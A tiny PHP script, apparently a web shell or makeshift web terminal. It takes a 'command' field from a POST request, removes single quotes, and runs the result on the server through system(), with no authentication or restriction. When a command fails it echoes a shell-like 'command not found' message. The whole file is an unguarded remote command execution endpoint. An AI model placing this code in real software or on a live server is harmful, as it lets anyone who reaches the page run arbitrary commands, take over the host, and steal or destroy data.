<?php
     $c=$_POST["command"];
     $c=str_replace("'","",$c);
     system(" ''".$c."'' ",$r);
     if($r!=0){
       echo "<p style='font-size:1em;color:crimson;'>$ Error command $c not found</p>";
       }
?>
